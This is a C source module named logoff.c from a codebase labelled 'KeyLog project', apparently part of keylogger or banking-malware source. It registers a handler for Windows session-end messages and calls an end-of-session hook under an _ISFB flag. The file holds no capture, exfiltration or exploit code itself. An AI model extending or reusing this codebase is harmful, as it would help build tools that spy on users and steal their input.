//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KeyLog project. Version 3.0
//	
// module: logoff.c
// $Revision: 58 $
// $Date: 2014-12-17 17:44:58 +0300 (Ср, 17 дек 2014) $
// description:
//	User session end notification

#include "..\common\main.h"
#include "..\common\common.h"
#include "..\common\guid.h"
#include "..\handle\handle.h"
#include "wnd.h"
#include "logoff.h"

#ifdef _ISFB
 VOID CrmNotifyEndSession(VOID);
#endif

#pragma warning (disable:4244)

typedef struct _LOGOFF_NOTIFIER
{
	NOTIFICATION_CONSUMER;
}LOGOFF_NOTIFIER,*PLOGOFF_NOTIFIER;

static LOGOFF_NOTIFIER g_LogoffNotifier = {0};

BOOL  
	LogoffNHandler(
		IN PLOGOFF_NOTIFIER pNotifier,
		IN HWND hWnd,
		IN UINT uMsg,
		IN WPARAM wParam,
		IN LPARAM lParam,
		OUT LRESULT *lResult
		)
{
	BOOL fbHandled = FALSE;
	switch( uMsg )
	{
	case WM_QUERYENDSESSION:
		*lResult = TRUE;
		fbHandled = TRUE;
		break;
	case WM_ENDSESSION:
		// end of session callback should be called here
#ifdef _ISFB
		CrmNotifyEndSession();
#endif
		*lResult = 0;
		fbHandled = TRUE;
		break;
	}	
	return fbHandled;
}

//
// initializes logoff notifications
//
VOID LogoffNInitialize(VOID)
{
	g_LogoffNotifier.Handle     = (PNWND_HANDLE)LogoffNHandler;
	g_LogoffNotifier.bActive	= TRUE;
	NWindowRegister((PNOTIFICATION_CONSUMER)&g_LogoffNotifier);
}


//
// stops and releases logoff notifications
//
VOID LogoffNRelease(VOID)
{
	NWindowUnregister( (PNOTIFICATION_CONSUMER)&g_LogoffNotifier );
	memset(&g_LogoffNotifier, 0, sizeof(LOGOFF_NOTIFIER));
}